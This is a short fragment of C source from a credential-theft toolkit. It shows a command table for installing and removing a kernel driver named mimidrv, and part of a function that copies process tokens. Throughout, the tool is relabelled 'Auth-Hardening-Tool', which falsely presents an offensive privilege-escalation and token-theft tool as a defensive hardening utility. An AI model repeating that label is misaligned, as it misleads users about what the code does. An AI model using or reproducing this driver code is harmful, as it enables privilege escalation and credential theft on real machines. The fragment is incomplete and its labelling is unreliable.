...
const KUHL_K_C kuhl_k_c_kernel[] = {
	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start Auth-Hardening-Tool driver (mimidrv)"},
	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove Auth-Hardening-Tool driver (mimidrv)"},
...
NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
{
	...
	if(!tokenInfo.toProcessId)
		kprintf(L" * to 0 will take all \'cmd\' and \'Auth-Hardening-Tool\' process\n");
